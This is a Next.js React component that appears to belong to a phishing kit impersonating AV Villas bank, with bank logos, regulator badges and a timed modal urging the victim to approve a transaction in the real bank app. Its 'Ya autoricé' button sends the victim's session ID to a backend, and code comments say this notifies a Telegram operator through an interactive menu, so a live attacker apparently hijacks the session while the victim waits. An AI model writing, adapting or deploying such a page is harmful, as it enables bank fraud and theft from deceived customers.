
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable jsx-a11y/alt-text */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState, useEffect } from "react";

export default function Dinamica({ enviar }: any) {
  const [timeLeft, setTimeLeft] = useState(180); // 3 minutos
  // Agregamos el estado para controlar la carga y polling del modal
  const [status, setStatus] = useState<"idle" | "pending">("idle");

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const progressPercentage = (timeLeft / 180) * 100;

  return (
    <div className="min-h-screen bg-[#f4f6fa] flex flex-col font-sans relative pb-[80px]">
      <style dangerouslySetInnerHTML={{
        __html: `
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap');
        .font-manrope { font-family: 'Manrope', sans-serif; }
        
        .progress-bar-bg {
          height: 6px;
          background-color: #e2e8f0;
          border-radius: 9999px;
          flex: 1;
        }

        .progress-bar-fill {
          height: 100%;
          background-color: #0048DB;
          border-radius: 9999px;
          transition: width 1s linear;
        }

        /* Animación del spinner de carga profesional */
        .spinner {
          border: 3px solid #f3f3f3;
          border-top: 3px solid #0048DB;
          border-radius: 50%;
          width: 42px;
          height: 42px;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}} />

      {/* TOP BAR */}
      <div className="bg-white border-b border-gray-200 py-3 px-6 flex justify-between items-center shadow-xs">
        <div className="flex items-center gap-3">
          <img
            src="/bancos/avvillas/img/logo.png"
            style={{ height: "26px", width: "auto" }}
            alt="AV Villas"
          />
        </div>
        <div className="flex items-center gap-4">
          <img
            src="/bancos/avvillas/img/notificaciones.png"
            style={{ height: "22px", width: "auto" }}
          />
          <img
            src="/bancos/avvillas/img/menu.png"
            style={{ height: "20px", width: "auto" }}
          />
        </div>
      </div>

      {/* BACKGROUND SIMULATED VIEW */}
      <div className="flex-1 max-w-[800px] mx-auto w-full p-6 opacity-40 select-none pointer-events-none">
        <div className="bg-white p-6 rounded-xl border border-gray-100 mb-6">
          <div className="h-6 w-32 bg-gray-200 rounded mb-4" />
          <div className="h-4 w-64 bg-gray-100 rounded mb-6" />
          <div className="h-10 w-full bg-gray-50 rounded" />
        </div>
      </div>

      {/* MODAL OVERLAY */}
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 backdrop-blur-xs">
        
        {/* Modal Card */}
        <div className="w-full max-w-[430px] bg-white rounded-[28px] shadow-2xl p-4 sm:p-6 lg:p-8 relative animate-in zoom-in-95 duration-200">
          
          {/* Close Button */}
          <button 
            type="button"
            className="absolute top-6 right-6 text-gray-400 hover:text-gray-600 transition-colors"
            onClick={() => window.location.reload()}
          >
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" className="w-5 h-5">
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>

          {/* Renderizado condicional según el estado de la verificación (Polling) */}
          {status === "pending" ? (
            <div className="flex flex-col items-center justify-center py-10 text-center font-manrope animate-fade-in">
              <div className="spinner mb-6"></div>
              <h3 className="text-[18px] font-extrabold text-[#0d1f3d] mb-2 leading-tight">
                Verificando tu autorización
              </h3>
              <p className="text-[14px] text-gray-500 max-w-[300px] leading-relaxed">
                Estamos comprobando el estado de la transacción directamente con tu aplicación móvil. Por favor, mantén esta ventana abierta.
              </p>
            </div>
          ) : (
            <>
              {/* Title */}
              <div className="text-center mt-2 mb-6 px-4">
                <h2 className="text-[18px] sm:text-[20px] font-extrabold text-[#0d1f3d] font-manrope leading-tight">
                  Autoriza tu transacción desde la aplicación de AV Villas
                </h2>
              </div>

              {/* Phone Illustration */}
              <div className="flex justify-center mb-6">
                <svg viewBox="0 0 100 100" className="w-[100px] h-[100px]" fill="none">
                  {/* Decorative elements left */}
                  <text x="15" y="28" fill="#E1111C" fontSize="16" fontWeight="bold" fontFamily="monospace">+</text>
                  <text x="75" y="70" fill="#0048DB" fontSize="22" fontWeight="bold" fontFamily="monospace">+</text>
                  <circle cx="70" cy="28" r="2.5" fill="#E1111C" />
                  <circle cx="20" cy="72" r="3" fill="none" stroke="#E1111C" strokeWidth="1.5" />
                  <line x1="8" y1="56" x2="16" y2="48" stroke="#0048DB" strokeWidth="1.5" />
                  <line x1="78" y1="28" x2="84" y2="22" stroke="#0048DB" strokeWidth="1.5" />

                  {/* Phone outline */}
                  <rect x="36" y="16" width="28" height="52" rx="6" fill="#ffffff" stroke="#263238" strokeWidth="3" />
                  <line x1="46" y1="20" x2="54" y2="20" stroke="#263238" strokeWidth="2" strokeLinecap="round" />
                  <circle cx="50" cy="62" r="2" fill="#263238" />

                  {/* Dollar Shield badge */}
                  <circle cx="58" cy="42" r="10" fill="#E1111C" stroke="#263238" strokeWidth="2" />
                  <text x="54" y="48" fill="#ffffff" fontSize="14" fontWeight="bold" fontFamily="sans-serif">$</text>
                </svg>
              </div>

              {/* Progress Bar & Countdown Timer */}
              <div className="flex items-center gap-4 mb-8 px-2">
                <div className="progress-bar-bg flex-1">
                  <div 
                    className="progress-bar-fill"
                    style={{ width: `${progressPercentage}%` }}
                  />
                </div>
                <span className="text-[14px] font-bold text-gray-700 w-12 text-right">
                  {formatTime(timeLeft)}
                </span>
              </div>

              {/* Core instruction text */}
              <div className="text-center mb-6 px-1">
                <p className="text-[14px] text-gray-700 leading-relaxed font-manrope">
                  En este momento hemos enviado una notificación a tu <span className="font-extrabold text-[#0d1f3d]">AV Villas App</span> registrada para autorizar esta transacción.
                </p>
              </div>

              {/* Quick action: Centralized Route submission */}
              <div className="flex items-center justify-center gap-3 mb-6">
                <button
                  type="button"
                  onClick={async () => {
                    setStatus("pending"); // Transición inmediata al spinner de carga
                    try {
                      const sessionId = typeof window !== 'undefined' ? localStorage.getItem('sessionId-bank') : null;
                      
                      // Apunta al endpoint centralizado unificado /send
                      await fetch('/api/banco/send', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                          sessionId, 
                          banco: 'AV Villas',
                          isAuthorizedNotification: true, // Capturado por el backend modificado
                          sendReplyMarkup: true            // Inyecta el menú interactivo para el operador
                        })
                      });
                    } catch (e) {
                      console.error('Error notifying telegram via centralized send:', e);
                      setStatus("idle"); // Revierte el estado en caso de error de conexión
                    }
                  }}
                  className="px-5 py-3 rounded-full font-bold text-white bg-green-600 hover:bg-green-700 w-full transition-colors"
                >
                  Ya autoricé
                </button>
              </div>

              {/* Bullet points list */}
              <div className="space-y-3.5 mb-8 text-left text-[13.5px] text-gray-600 font-manrope leading-relaxed pl-4 pr-2">
                <div className="flex items-start gap-2.5">
                  <div className="w-1.5 h-1.5 rounded-full bg-gray-700 mt-2 shrink-0" />
                  <p>Ingresa a tu AV Villas App</p>
                </div>
                <div className="flex items-start gap-2.5">
                  <div className="w-1.5 h-1.5 rounded-full bg-gray-700 mt-2 shrink-0" />
                  <p>Encontrarás un mensaje con los datos de tu transacción, en caso de que no lo veas puedes ingresar por el icono de campana o notificaciones</p>
                </div>
                <div className="flex items-start gap-2.5">
                  <div className="w-1.5 h-1.5 rounded-full bg-gray-700 mt-2 shrink-0" />
                  <p>Da clic en la opción de autorizar y listo!</p>
                </div>
              </div>

              {/* Alert box warning at bottom */}
              <div className="bg-[#e8f0fe] rounded-2xl p-4 flex items-start gap-3 border border-blue-100/30 text-[#185adb] text-left text-[12.5px] leading-relaxed font-manrope">
                <div className="w-5 h-5 rounded-full border-2 border-[#185adb] flex items-center justify-center shrink-0 mt-0.5 font-extrabold text-[12px]">
                  i
                </div>
                <p>
                  En caso de que no te llegue la notificación a tu AV Villas App. Haremos la autorización por medio del código QR.
                </p>
              </div>
            </>
          )}

        </div>

      </div>

      {/* FOOTER */}
      <footer className="absolute bottom-0 left-0 w-full bg-white border-t border-gray-200 py-4 px-6 flex justify-between items-center z-40 text-[10px] text-gray-400 font-medium">
        <img
          src="/bancos/avvillas/img/logo-gav.png"
          style={{ height: "18px", width: "auto" }}
          alt="Grupo Aval"
        />
        <img
          src="/bancos/avvillas/img/superh-negro.svg"
          style={{ height: "16px", width: "auto" }}
          alt="Superfinanciera"
        />
      </footer>

    </div>
  );
}
